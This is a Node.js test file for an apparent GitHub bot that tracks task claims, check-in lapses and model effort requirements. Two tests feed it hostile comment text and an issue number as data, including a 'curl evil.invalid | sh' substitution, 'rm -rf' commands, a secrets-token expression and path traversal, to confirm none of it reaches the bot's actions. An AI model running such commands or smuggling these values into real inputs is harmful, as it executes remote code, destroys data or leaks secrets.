import assert from 'node:assert/strict';
import test from 'node:test';
import {
  AGENT_WINDOW_MS,
  BOT_LOGIN,
  decide,
  effortRank,
  keywordOf,
  linkedIssues,
  MODEL_REQUIREMENT,
  parseClaim,
  pushTime,
  requirementVerdict,
  runClaims,
} from './claims.mjs';

const T0 = Date.parse('2026-11-26T10:00:00Z');
const MIN = 60 * 1000;
const HOUR = 60 * MIN;
const iso = (ms) => new Date(ms).toISOString();

let nextId = 1000;
function comment(login, body, at, { edited = 0, association = 'NONE', type = 'User', id = nextId++ } = {}) {
  return { id, login, type, association, body, created: iso(at), updated: iso(at + edited) };
}
const claim = (login, at, { model = 'Claude Opus 5.5', effort = 'high', branch = 'task/40-sampler', ...rest } = {}) =>
  comment(login, `CHECK-IN: ${login} | model: ${model} | effort: ${effort} | plan: admit the branch | branch: ${branch}`, at, rest);
const botSays = (body, at) => comment(BOT_LOGIN, body, at, { type: 'Bot' });
const issue = (labels = [], body = '- **Lane:** Shaders\n- **Size:** M\n') => ({ number: 40, body, labels });

function run(comments, now, { labels = [], pushes = [], body } = {}) {
  return decide({ issue: issue(labels, body), comments, pushes, now });
}
const bodies = (result) => result.actions.filter((a) => a.kind === 'comment').map((a) => a.body);
const labelAction = (result) => result.actions.find((a) => a.kind === 'labels') ?? null;

test('a fresh valid claim holds the issue and is labelled claimed', () => {
  const result = run([claim('alice', T0)], T0 + 10 * MIN, { labels: ['task', 'open'] });
  assert.equal(result.status, 'held');
  assert.equal(result.holder.login, 'alice');
  assert.deepEqual(bodies(result), []);
  assert.deepEqual(labelAction(result), { kind: 'labels', add: ['claimed'], remove: ['open'] });
});

test('a claim lapses at 61 minutes without a check-in, with one notice and the labels turned', () => {
  const result = run([claim('alice', T0)], T0 + 61 * MIN, { labels: ['task', 'claimed'] });
  assert.equal(result.status, 'lapsed');
  assert.deepEqual(bodies(result), ['CLAIM LAPSED: alice, no check-in since 2026-11-26 10:00 UTC; open to claim']);
  assert.deepEqual(labelAction(result), { kind: 'labels', add: ['open'], remove: ['claimed'] });
});

test('exactly 60 minutes is still live; the window is the one exported', () => {
  assert.equal(AGENT_WINDOW_MS, 60 * MIN);
  assert.equal(run([claim('alice', T0)], T0 + 60 * MIN).status, 'held');
});

test('a PROGRESS at 59 minutes keeps the claim alive past the first hour', () => {
  const comments = [claim('alice', T0), comment('alice', 'PROGRESS: the fixture fails as expected; next the fix', T0 + 59 * MIN)];
  const at100 = run(comments, T0 + 100 * MIN);
  assert.equal(at100.status, 'held');
  assert.equal(at100.holder.last, T0 + 59 * MIN);
  assert.equal(run(comments, T0 + 120 * MIN).status, 'lapsed');
});

test('a human claim holds at 47 hours and lapses at 49', () => {
  const comments = [claim('carol', T0, { model: 'human', effort: 'n/a' })];
  assert.equal(run(comments, T0 + 47 * HOUR).status, 'held');
  const late = run(comments, T0 + 49 * HOUR);
  assert.equal(late.status, 'lapsed');
  assert.match(bodies(late)[0], /^CLAIM LAPSED: carol, no check-in since 2026-11-26 10:00 UTC; open to claim$/);
});

test('a human claim is not flagged by the model requirement', () => {
  assert.deepEqual(bodies(run([claim('carol', T0, { model: 'human', effort: 'n/a' })], T0 + MIN)), []);
});

test('a RELEASE by the holder frees the issue at once, with no lapse notice', () => {
  const comments = [claim('alice', T0), comment('alice', 'RELEASE: alice | reason: the task is two tasks', T0 + 5 * MIN)];
  const result = run(comments, T0 + 3 * HOUR, { labels: ['claimed'] });
  assert.equal(result.status, 'free');
  assert.deepEqual(bodies(result), []);
  assert.deepEqual(labelAction(result), { kind: 'labels', add: ['open'], remove: ['claimed'] });
});

test("a RELEASE by someone else frees nothing; a maintainer's does", () => {
  const stranger = [claim('alice', T0), comment('mallory', 'RELEASE: mallory | reason: mine now', T0 + MIN)];
  assert.equal(run(stranger, T0 + 2 * MIN).status, 'held');
  const maintainer = [claim('alice', T0), comment('maint', 'RELEASE: maint | reason: the pull request closed', T0 + MIN, { association: 'MEMBER' })];
  assert.equal(run(maintainer, T0 + 2 * MIN).status, 'free');
});

test('a second claim on a held issue gets one answer naming the holder, and does not take it', () => {
  const comments = [claim('alice', T0), claim('bob', T0 + 10 * MIN)];
  const result = run(comments, T0 + 20 * MIN);
  assert.equal(result.holder.login, 'alice');
  const said = bodies(result);
  assert.equal(said.length, 1);
  assert.match(said[0], /^CLAIM HELD: comment \d+ by bob is not a claim: alice holds this issue since 2026-11-26 10:00 UTC;/);
});

test("someone else's check-in does not refresh the holder's claim", () => {
  const comments = [claim('alice', T0), comment('bob', 'PROGRESS: alice is doing well', T0 + 30 * MIN)];
  assert.equal(run(comments, T0 + 61 * MIN).status, 'lapsed');
});

test('after a lapse anyone may claim, and the lapse notice is not posted', () => {
  const comments = [claim('alice', T0), claim('bob', T0 + 2 * HOUR)];
  const result = run(comments, T0 + 2 * HOUR + MIN);
  assert.equal(result.holder.login, 'bob');
  assert.deepEqual(bodies(result), []);
});

test("the old holder's PROGRESS after a lapse does not revive the claim", () => {
  const comments = [claim('alice', T0), comment('alice', 'PROGRESS: back again', T0 + 2 * HOUR)];
  assert.equal(run(comments, T0 + 2 * HOUR + MIN).status, 'lapsed');
});

test('a comment that quotes CHECK-IN: mid-line, or in a quote, is not a claim', () => {
  const comments = [
    comment('alice', 'I will post CHECK-IN: alice | model: x | effort: y | plan: z | branch: b soon', T0),
    comment('bob', '> CHECK-IN: bob | model: Claude Opus 5.5 | effort: high | plan: p | branch: task/1-x', T0 + MIN),
    comment('dave', '```\nCHECK-IN: dave | model: Claude Opus 5.5 | effort: high | plan: p | branch: task/1-x\n```', T0 + 2 * MIN),
  ];
  const result = run(comments, T0 + 3 * MIN);
  assert.equal(result.status, 'free');
  assert.deepEqual(bodies(result), []);
  assert.equal(keywordOf('\n\n  CHECK-IN: alice | x').keyword, 'CHECK-IN', 'leading blank lines are allowed');
  assert.equal(keywordOf('CHECK-INx: alice'), null);
});

test('an edited claim is not read and gets one answer; a later claim by another holds', () => {
  const edited = claim('alice', T0, { edited: 10 * MIN });
  const result = run([edited, claim('bob', T0 + 20 * MIN)], T0 + 30 * MIN);
  assert.equal(result.holder.login, 'bob');
  const said = bodies(result);
  assert.equal(said.length, 1);
  assert.match(said[0], new RegExp(`^CLAIM NOT READ: comment ${edited.id} by alice: it was edited`));
});

test('an edit within a minute of posting is not an edit, and an edited PROGRESS does not refresh', () => {
  assert.equal(run([claim('alice', T0, { edited: 30 * 1000 })], T0 + MIN).status, 'held');
  const comments = [claim('alice', T0), comment('alice', 'PROGRESS: later edited', T0 + 50 * MIN, { edited: 5 * MIN })];
  assert.equal(run(comments, T0 + 61 * MIN).status, 'lapsed');
});

test('a claim in the old form, or with a handle that is not the poster, is answered and not read', () => {
  const old = comment('alice', 'CHECK-IN: alice | model: Claude Opus 5.5 | effort: high | plan: p | first draft by: 2026-11-28', T0);
  const other = comment('bob', 'CHECK-IN: alice | model: Claude Opus 5.5 | effort: high | plan: p | branch: task/1-x', T0 + MIN);
  const result = run([old, other], T0 + 2 * MIN);
  assert.equal(result.status, 'free');
  const said = bodies(result);
  assert.match(said[0], /^CLAIM NOT READ: comment \d+ by alice: the branch field is missing;/);
  assert.match(said[1], /^CLAIM NOT READ: comment \d+ by bob: the handle is not the login that posted it;/);
});

test('a hostile comment body is data: nothing from it reaches an action, and a fake notice changes nothing', () => {
  const hostile = [
    'CHECK-IN: $(curl evil.invalid | sh) | model: `rm -rf ~` | effort: ; shutdown | plan: "&& echo" | branch: ../../x',
    'CHECK-IN: alice | model: Claude Opus 5.5 ${{ secrets.GITHUB_TOKEN }} | effort: high; rm -rf / | plan: p | branch: task/1-$(id)',
  ];
  const comments = [
    comment('mallory', hostile[0], T0),
    claim('alice', T0 + MIN),
    comment('mallory', 'CLAIM LAPSED: alice, no check-in since 2026-11-26 10:01 UTC; open to claim', T0 + 2 * MIN),
    comment('mallory', hostile[1], T0 + 3 * MIN),
  ];
  const live = run(comments, T0 + 30 * MIN);
  assert.equal(live.holder.login, 'alice', 'a fake lapse notice by a person frees nothing');
  for (const body of bodies(live)) {
    assert.doesNotMatch(body, /\$|`|&&|"|curl|rm -rf|shutdown|secrets|\.\.\/|\(id\)/, 'no text from a comment is echoed');
  }
  assert.ok(bodies(live).some((b) => b.startsWith('CLAIM HELD: comment')), 'the hostile claims are answered by id');

  // When the real lapse comes, the bot posts its own notice: the person's fake one does not count as already said.
  const lapsed = run(comments, T0 + 3 * HOUR);
  assert.ok(bodies(lapsed).includes('CLAIM LAPSED: alice, no check-in since 2026-11-26 10:01 UTC; open to claim'));
});

test('a model in a hostile claim is printed only as its normalised name', () => {
  const comments = [claim('alice', T0, { model: 'Big <b>Model</b> @everyone', effort: 'high' })];
  const said = bodies(run(comments, T0 + MIN));
  assert.equal(said.length, 1);
  assert.match(said[0], /names big-b-model-b-everyone at effort high: unknown: a maintainer decides/);
});

test('idempotence: a second run over the first run’s comments posts nothing new', () => {
  const comments = [claim('alice', T0), claim('bob', T0 + 5 * MIN, { model: 'GPT-6.2 Sol', effort: 'medium' })];
  const first = run(comments, T0 + 2 * HOUR, { labels: ['claimed'] });
  assert.equal(bodies(first).length, 2, 'the answer to the second claim and the lapse notice');
  const after = [...comments, ...bodies(first).map((body, i) => botSays(body, T0 + 2 * HOUR + i))];
  const second = run(after, T0 + 2 * HOUR + 15 * MIN, { labels: ['open'] });
  assert.deepEqual(second.actions, []);
  const third = run(after, T0 + 9 * HOUR, { labels: ['open'] });
  assert.deepEqual(third.actions, [], 'still one notice for the same lapse hours later');
});

test('the same login lapsing twice gets a notice for each claim', () => {
  const first = [claim('alice', T0), botSays('CLAIM LAPSED: alice, no check-in since 2026-11-26 10:00 UTC; open to claim', T0 + 70 * MIN)];
  const again = [...first, claim('alice', T0 + 3 * HOUR)];
  assert.deepEqual(bodies(run(again, T0 + 5 * HOUR)), ['CLAIM LAPSED: alice, no check-in since 2026-11-26 13:00 UTC; open to claim']);
});

test("a push by the holder to the claimed branch is a check-in; another's push or branch is not", () => {
  const comments = [claim('alice', T0)];
  const at = T0 + 50 * MIN;
  assert.equal(run(comments, T0 + 100 * MIN, { pushes: [{ login: 'alice', branch: 'task/40-sampler', at }] }).status, 'held');
  assert.equal(run(comments, T0 + 100 * MIN, { pushes: [{ login: 'bob', branch: 'task/40-sampler', at }] }).status, 'lapsed');
  assert.equal(run(comments, T0 + 100 * MIN, { pushes: [{ login: 'alice', branch: 'other', at }] }).status, 'lapsed');
});

test("a push time is the head commit's date, never later than the fork's last push", () => {
  assert.equal(pushTime('2026-11-26T10:00:00Z', '2026-11-26T10:05:00Z'), Date.parse('2026-11-26T10:00:00Z'));
  assert.equal(pushTime('2030-01-01T00:00:00Z', '2026-11-26T10:05:00Z'), Date.parse('2026-11-26T10:05:00Z'));
  assert.equal(pushTime(undefined, '2026-11-26T10:05:00Z'), null);
});

test('after CHECK-OUT the claim holds through review without check-ins', () => {
  const comments = [claim('alice', T0), comment('alice', 'CHECK-OUT: alice | PR: #77 | result: twelve translate', T0 + 30 * MIN)];
  const result = run(comments, T0 + 5 * 24 * HOUR);
  assert.equal(result.status, 'review');
  assert.deepEqual(bodies(result), []);
});

// The four named models and the least effort each may run at (AGENTS.md, "Which model"), with one level below it.
const NAMED = [
  { model: 'GPT-6.2 Sol', at: 'high', below: 'medium', above: 'xhigh' },
  { model: 'Claude Opus 5.5', at: 'high', below: 'medium', above: 'max' },
  { model: 'Claude Fable 5.2', at: 'medium', below: 'low', above: 'high' },
  { model: 'Gemini 4 Neon', at: 'medium', below: 'low', above: 'xhigh' },
];

test('the table holds exactly the four named models with their least effort', () => {
  assert.deepEqual(
    MODEL_REQUIREMENT.map((row) => [row.name, row.minEffort]),
    NAMED.map((row) => [row.model, row.at]),
  );
});

test('each named model at its least effort meets the requirement, and a higher level does too', () => {
  for (const { model, at, above } of NAMED) {
    assert.equal(requirementVerdict(model, at).verdict, 'meets', `${model} at ${at}`);
    assert.equal(requirementVerdict(model, above).verdict, 'meets', `${model} at ${above}`);
    assert.deepEqual(bodies(run([claim('alice', T0, { model, effort: at })], T0 + MIN)), [], `${model} at ${at} is not flagged`);
  }
});

test('one level below its least effort, a named model is flagged with the exact minimum it needs', () => {
  for (const { model, at, below } of NAMED) {
    const verdict = requirementVerdict(model, below);
    assert.equal(verdict.verdict, 'below', `${model} at ${below}`);
    assert.equal(verdict.needs, at);
    const result = run([claim('alice', T0, { model, effort: below })], T0 + MIN);
    assert.equal(result.status, 'held', 'a flagged claim still holds the issue');
    const said = bodies(result);
    assert.equal(said.length, 1);
    assert.match(
      said[0],
      new RegExp(`^MODEL REQUIREMENT: comment \\d+ by alice names [a-z0-9-]+ at effort ${below}, below the requirement: ${model.replace(/\./g, '\\.')} needs ${at} effort or above; a maintainer may ask for a rebuild`),
    );
  }
});

test("effort levels rank low < medium < high < xhigh < max, in the vendors' spellings and any case", () => {
  const ranks = ['low', 'medium', 'high', 'xhigh', 'max'].map(effortRank);
  assert.deepEqual(ranks, [0, 1, 2, 3, 4]);
  for (const [word, rank] of [['HIGH', 2], ['Medium', 1], ['x-high', 3], ['Extra high', 3], ['extra_high', 3], ['XHIGH', 3], ['Max', 4], ['maximum', 4], ['minimal', -1], ['none', -1]]) {
    assert.equal(effortRank(word), rank, word);
  }
  assert.equal(effortRank('whatever'), null);
  assert.equal(requirementVerdict('gpt-6.2-sol', 'Extra High').verdict, 'meets');
  assert.equal(requirementVerdict('claude-opus-5-5', 'minimal').verdict, 'below');
  assert.equal(requirementVerdict('Claude Fable 5.2', 'MEDIUM').verdict, 'meets');
});

test('a model not in the table is unknown: flagged for a maintainer, never rejected', () => {
  for (const model of ['unknown', 'Some Other Model 3', 'A Small Model']) {
    assert.equal(requirementVerdict(model, 'max').verdict, 'unknown', model);
    const result = run([claim('alice', T0, { model, effort: 'max' })], T0 + MIN);
    assert.equal(result.status, 'held', 'an unknown model is never rejected');
    assert.equal(result.holder.login, 'alice');
    assert.match(bodies(result)[0], /^MODEL REQUIREMENT: comment \d+ by alice names [a-z0-9-]+ at effort max: unknown: a maintainer decides/);
  }
  assert.equal(requirementVerdict('Human', 'n/a').verdict, 'human');
});

test('a named model with an effort word the bot cannot rank is flagged with its minimum, and still holds', () => {
  const result = run([claim('alice', T0, { model: 'GPT-6.2 Sol', effort: 'whatever' })], T0 + MIN);
  assert.equal(result.status, 'held');
  assert.match(bodies(result)[0], /names gpt-6-2-sol at effort whatever, an effort level the bot cannot rank: GPT-6\.2 Sol needs high effort or above; a maintainer decides/);
});

test('a claim with no effort field is not read, holds nothing, and is answered once', () => {
  const missing = comment('alice', 'CHECK-IN: alice | model: Claude Opus 5.5 | plan: p | branch: task/40-x', T0);
  const result = run([missing], T0 + MIN);
  assert.equal(result.status, 'free');
  assert.deepEqual(bodies(result).length, 1);
  assert.match(bodies(result)[0], /^CLAIM NOT READ: comment \d+ by alice: the effort field is missing;/);
  const empty = comment('bob', 'CHECK-IN: bob | model: Claude Opus 5.5 | effort: | plan: p | branch: task/40-x', T0);
  assert.match(bodies(run([empty], T0 + MIN))[0], /: the effort field is missing;/);
});

test('claim lines parse to fields with fixed errors', () => {
  assert.deepEqual(parseClaim('CHECK-IN: alice | model: Claude Opus 5.5 | effort: high | plan: admit it | branch: task/40-x'), {
    handle: 'alice',
    model: 'Claude Opus 5.5',
    effort: 'high',
    plan: 'admit it',
    branch: 'task/40-x',
  });
  assert.deepEqual(parseClaim('CHECK-IN: alice | model: m | effort: e | plan: p | branch: a..b'), {
    error: 'the branch is not a plain branch name',
  });
  assert.deepEqual(parseClaim(`CHECK-IN: alice | plan: ${'x'.repeat(600)}`), { error: 'the line is longer than 500 characters' });
});

test('a pull request links its task by Task: #n or Closes #n at the start of a line', () => {
  assert.deepEqual(linkedIssues('Task: #40\nModel: x\n\nCloses #41\nsee #42'), [40, 41]);
  assert.deepEqual(linkedIssues('This mentions Task: #9 mid-line'), []);
});

// A fake REST API: answers the routes one pass reads and records every call. No network.
function fakeGitHub(routes) {
  const calls = [];
  const fetchImpl = async (url, init) => {
    const route = url.replace('https://api.github.com/repos/o/r', '');
    const key = `${init.method} ${route}`;
    calls.push({ key, body: init.body ? JSON.parse(init.body) : null });
    const hit = Object.entries(routes).find(([pattern]) => key === pattern || key.startsWith(`${pattern}?`) || key.startsWith(`${pattern}&`));
    const [status, data] = hit ? hit[1] : init.method === 'GET' ? [404, null] : [201, {}];
    return { ok: status < 400, status, json: async () => data };
  };
  return { calls, fetchImpl };
}

test('one pass over the REST API: reads tasks, comments and a linked push, then posts the lapse and turns the labels', async () => {
  const sha = 'a'.repeat(40);
  const routes = {
    'GET /issues?state=open&labels=task': [200, [
      { number: 40, state: 'open', comments: 1, body: '- **Size:** M', labels: [{ name: 'task' }, { name: 'claimed' }] },
      { number: 41, state: 'open', comments: 0, body: '', labels: [{ name: 'task' }, { name: 'open' }] },
      { number: 42, state: 'open', comments: 0, body: '', labels: [{ name: 'task' }], pull_request: {} },
    ]],
    'GET /issues?state=open&labels=job': [200, []],
    'GET /pulls?state=open': [200, [
      { body: 'Task: #40\nModel: Claude Opus 5.5', user: { login: 'alice' }, head: { ref: 'task/40-sampler', sha, repo: { pushed_at: iso(T0 + 55 * MIN) } } },
    ]],
    'GET /issues/40/comments': [200, [{ ...claim('alice', T0), user: { login: 'alice', type: 'User' }, author_association: 'NONE', created_at: iso(T0), updated_at: iso(T0) }]],
    [`GET /commits/${sha}`]: [200, { commit: { committer: { date: iso(T0 + 50 * MIN) } } }],
  };
  const env = { GITHUB_REPOSITORY: 'o/r', GITHUB_TOKEN: 'test-token' };
  const lines = [];

  const dry = fakeGitHub(routes);
  assert.equal(await runClaims({ args: ['--dry-run'], env, now: T0 + 2 * HOUR, fetchImpl: dry.fetchImpl, log: (l) => lines.push(l) }), 0);
  assert.deepEqual(dry.calls.filter((c) => !c.key.startsWith('GET ')), [], 'a dry run writes nothing');
  assert.ok(lines.some((l) => /^#40: lapsed; CLAIM LAPSED; \+open -claimed \(dry run\)$/.test(l)), lines.join('\n'));

  const real = fakeGitHub(routes);
  assert.equal(await runClaims({ env, now: T0 + 2 * HOUR, fetchImpl: real.fetchImpl, log: () => {} }), 0);
  const writes = real.calls.filter((c) => !c.key.startsWith('GET ') || c.key.startsWith('GET /labels/'));
  assert.deepEqual(writes, [
    { key: 'POST /issues/40/comments', body: { body: 'CLAIM LAPSED: alice, no check-in since 2026-11-26 10:50 UTC; open to claim' } },
    { key: 'GET /labels/open', body: null },
    { key: 'POST /labels', body: { name: 'open', color: '0e8a16', description: 'Open to claim (TASKS.md)' } },
    { key: 'POST /issues/40/labels', body: { labels: ['open'] } },
    { key: 'DELETE /issues/40/labels/claimed', body: null },
  ]);
  assert.ok(!real.calls.some((c) => c.key.includes('/issues/42/')), 'a pull request is not a task');
});

test('a comment event reads only its own issue, and a bad issue number is refused', async () => {
  const gh = fakeGitHub({ 'GET /issues/41': [200, { number: 41, state: 'open', comments: 0, body: '', labels: [{ name: 'task' }, { name: 'open' }] }] });
  const env = { GITHUB_REPOSITORY: 'o/r', GITHUB_TOKEN: 'test-token', ISSUE_NUMBER: '41' };
  assert.equal(await runClaims({ env, now: T0, fetchImpl: gh.fetchImpl, log: () => {} }), 0);
  assert.deepEqual(gh.calls.map((c) => c.key), ['GET /issues/41']);
  await assert.rejects(runClaims({ env: { ...env, ISSUE_NUMBER: '41; rm -rf /' }, fetchImpl: gh.fetchImpl }), /--issue needs an issue number/);
});
